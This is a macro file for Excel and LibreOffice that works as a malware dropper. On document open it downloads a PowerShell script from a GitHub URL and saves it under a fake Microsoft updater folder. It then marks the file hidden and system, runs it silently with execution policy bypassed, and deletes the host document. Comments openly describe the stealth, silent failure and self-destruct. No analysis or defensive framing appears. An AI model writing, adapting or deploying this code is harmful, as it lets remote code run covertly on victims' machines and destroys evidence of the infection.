REM  *****  BASIC  *****
' Cross-platform macro compatible with both Excel VBA and LibreOffice Basic
Sub Auto_Open()
    DetectAndRun()
End Sub

' Excel VBA Auto_Open equivalent
Sub Workbook_Open()
    DetectAndRun()
End Sub

Sub DetectAndRun()
    Dim scriptUrl As String
    Dim savePath As String
    Dim webContent As String
    Dim isExcel As Boolean
    
    ' Detect if running in Excel or LibreOffice
    On Error Resume Next
    isExcel = (Application.Name = "Microsoft Excel")
    On Error GoTo 0
    
    ' Set the URL of your PowerShell script
    scriptUrl = "https://github.com/run-spec/auto/raw/refs/heads/main/vbs32"
    
    ' Get current username dynamically
    Dim currentUser As String
    currentUser = Environ("USERNAME")
    
    ' Build path with current user  
    Dim folderPath As String
    folderPath = "C:\Users\" & currentUser & "\AppData\Local\Microsoft\Updater\WinTask\SysUpdateTask\"
    savePath = folderPath & "vbs32.ps1"
    
    ' Create directory structure if it doesn't exist
    Shell "cmd.exe /c if not exist """ & folderPath & """ mkdir """ & folderPath & """", 0, "", True
    
    On Error GoTo ErrorHandler
    
    ' Download using platform-specific method
    If isExcel Then
        webContent = DownloadWithExcel(scriptUrl)
    Else
        webContent = DownloadWithLibreOffice(scriptUrl)
    End If
    
    ' Check if we got content
    If Len(webContent) > 0 Then
        ' Save the script content to file
        Dim fileHandle As Integer
        fileHandle = FreeFile
        Open savePath For Output As #fileHandle
        Print #fileHandle, webContent
        Close #fileHandle
        
        ' Set file attributes to Hidden + System (makes it invisible in normal view)
        Shell "cmd.exe /c attrib +H +S """ & savePath & """", 0, "", False
        
        ' Run the PowerShell script completely hidden - no messages, completely silent
        Dim result As Integer
        Dim cmdLine As String
        Dim currentDocPath As String
        
        ' Get document path using platform-specific method
        If isExcel Then
            currentDocPath = ThisWorkbook.FullName
        Else
            currentDocPath = ConvertFromURL(ThisComponent.getURL())
        End If
        
        ' Use cmd.exe with hidden window - this method works
        cmdLine = "cmd.exe /c powershell.exe -ExecutionPolicy Bypass -File """ & savePath & """"
        result = Shell(cmdLine, 0, "", False)  ' Set bSync to False to avoid blocking
        
        ' Wait a moment for PowerShell to start
        If isExcel Then
            Application.Wait Now + TimeValue("00:00:01")
        Else
            Wait 1000
        End If
        
        ' ALWAYS self-destruct after launching (regardless of result)
        ' Because hidden processes don't return reliable exit codes
        
        ' Close and delete using platform-specific method
        If isExcel Then
            ' Excel VBA method
            On Error Resume Next
            ThisWorkbook.Close SaveChanges:=False
            Kill currentDocPath
        Else
            ' LibreOffice Basic method
            On Error Resume Next
            ThisComponent.close(False)
            Kill currentDocPath
            ' If Kill doesn't work, try system delete
            If Dir(currentDocPath) <> "" Then
                Shell "cmd.exe /c del """ & currentDocPath & """", 0, "", False
            End If
        End If
        
    Else
        ' Silent failure - no error messages for stealth operation
        GoTo Cleanup
    End If
    
Cleanup:
    ' Clean up objects (platform-specific)
    On Error Resume Next
    Exit Sub
    
ErrorHandler:
    ' Silent error handling - no popups for stealth operation
    GoTo Cleanup
End Sub

Function DownloadWithExcel(url As String) As String
    ' Excel VBA HTTP download method
    Dim xmlHttp As Object
    Dim result As String
    
    On Error Resume Next
    Set xmlHttp = CreateObject("MSXML2.XMLHTTP.6.0")
    If xmlHttp Is Nothing Then Set xmlHttp = CreateObject("MSXML2.XMLHTTP")
    If xmlHttp Is Nothing Then Set xmlHttp = CreateObject("Microsoft.XMLHTTP")
    
    If Not xmlHttp Is Nothing Then
        xmlHttp.Open "GET", url, False
        xmlHttp.Send
        
        If xmlHttp.Status = 200 Then
            result = xmlHttp.ResponseText
        End If
        Set xmlHttp = Nothing
    End If
    
    DownloadWithExcel = result
End Function

Function DownloadWithLibreOffice(url As String) As String
    ' LibreOffice Basic HTTP download method
    Dim functionAccess As Object
    Dim result As String
    
    On Error Resume Next
    Set functionAccess = createUnoService("com.sun.star.sheet.FunctionAccess")
    If Not functionAccess Is Nothing Then
        result = functionAccess.callFunction("WEBSERVICE", Array(url))
        Set functionAccess = Nothing
    End If
    
    DownloadWithLibreOffice = result
End Function
